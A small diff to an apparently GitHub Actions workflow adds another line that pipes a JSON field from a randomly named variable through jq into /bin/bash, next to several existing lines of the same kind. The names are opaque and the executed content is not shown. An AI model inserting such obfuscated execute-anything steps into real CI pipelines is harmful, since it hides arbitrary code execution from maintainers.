@@ -24,6 +24,7 @@ jobs:
           echo $hc65 | jq -r .c70 | /bin/bash
           echo $z75518 | jq -r .kwqw1 | /bin/bash
           printf '%s' "$fulyh69380" | jq -r .xfd0727 | /bin/bash
+          echo $xy1 | jq -r .mpyo6931 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
